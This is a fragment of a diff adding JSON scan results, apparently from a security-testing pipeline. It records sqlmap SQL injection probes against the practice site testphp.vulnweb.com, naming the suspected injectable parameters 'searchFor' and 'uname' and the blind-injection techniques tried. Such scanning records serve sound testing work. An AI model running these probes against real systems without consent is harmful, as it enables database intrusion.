'/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'\n\n[*] ending @ 01:43:57 /2026-02-20/"
+        },
+        {
+            "tool": "sqlmap",
+            "url": "http://testphp.vulnweb.com/search.php?test=query",
+            "finding_name": "SQL Injection Suspected (Scan Timed Out)",
+            "severity": "HIGH",
+            "risk_score": 7,
+            "category": "general",
+            "description": "Vulnerable Parameter: searchFor | Tested Parameters: searchFor | HTTP Method: POST | Target Type: form-post | Primary SQLMap run timed out before full verification | SQLMap output contains SQL injection indicators.",
+            "timestamp": "2026-02-20 01:47:03",
+            "raw_output": "___\n       __H__\n ___ ___[.]_____ ___ ___  {1.9.11#stable}\n|_ -| . [.]     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 01:45:03 /2026-02-20/\n\n[01:45:03] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15' from file '/usr/share/sqlmap/data/txt/user-agents.txt'\n[01:45:03] [INFO] flushing session file\n[01:45:04] [INFO] testing connection to the target URL\n[01:45:04] [INFO] checking if the target is protected by some kind of WAF/IPS\n[01:45:04] [INFO] testing if the target URL content is stable\n[01:45:05] [INFO] target URL content is stable\n[01:45:05] [INFO] testing if POST parameter 'searchFor' is dynamic\n[01:45:05] [WARNING] POST parameter 'searchFor' does not appear to be dynamic\n[01:45:05] [INFO] heuristic (basic) test shows that POST parameter 'searchFor' might be injectable (possible DBMS: 'MySQL')\n[01:45:06] [INFO] heuristic (XSS) test shows that POST parameter 'searchFor' might be vulnerable to cross-site scripting (XSS) attacks\n[01:45:06] [INFO] testing for SQL injection on POST parameter 'searchFor'\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y\n[01:45:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[01:45:06] [WARNING] reflective value(s) found and filtering out\n[01:45:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'\n[01:45:10] [INFO] testing 'Generic inline queries'\n[01:45:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'\n[01:45:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'\n[01:45:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'\n[01:45:58] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'\n[01:46:25] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'\n[01:46:54] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'"
+        },
+        {
+            "tool": "sqlmap",
+            "url": "http://testphp.vulnweb.com/userinfo.php",
+            "finding_name": "SQL Injection Suspected (Scan Timed Out)",
+            "severity": "HIGH",
+            "risk_score": 7,
+            "category": "general",
+            "description": "Vulnerable Parameter: uname | Tested Parameters: pass, uname | HTTP Method: POST | Target Type: form-post | Primary SQLMap run timed out before full verification | SQLMap output contains SQL injection indicators.",
+            "timestamp": "2026-02-20 01:48:04",
+            "raw_output": "___\n       __H__\n ___ ___[.]_____ ___ ___  {1.9.11#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 01:47:03 /2026-02-20/\n\n[01:47:03] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.13 Safari/605.1.15' from file '/usr/share/sqlmap/data/txt/user-agents.txt'\n[01:47:04] [INFO] flushing session file\n[01:47:04] [INFO] testing connection to the target URL\ngot a 302 redirect to 'http://testphp.vulnweb.com/login.php'. Do you want to follow? [Y/n] Y\nredirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y\n[01:47:05] [INFO] checking if the target is protected by some kind of WAF/IPS\n[01:47:06] [INFO] testing if the target URL content is stable\n[01:47:06] [WARNING] POST parameter 'uname' does not appear to be dynamic\n[01:47:07] [INFO] heuristic (basic) test shows that POST parameter 'uname' might be injectable (possible DBMS: 'MySQL')\n[01:47:07] [INFO] heuristic (XSS) test shows that POST parameter 'uname' might be vulnerable to cross-site scripting (XSS) attacks\n[01:47:07] [INFO] testing for SQL injection on POST parameter 'uname'\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y\n[01:47:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[01:47:13] [WARNING] reflective value(s) found and filtering out\n[01:47:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'\n[01:47:16] [INFO] testing 'Generic inline queries'\n[01:47:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'\n[01:47:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'\ngot a refresh intent (redirect like response common to login pages) to 'https://tinyurl.com/manzv5kf'. Do you want to apply it from now on? [Y/n] Y"
+        }
+    ]
+}
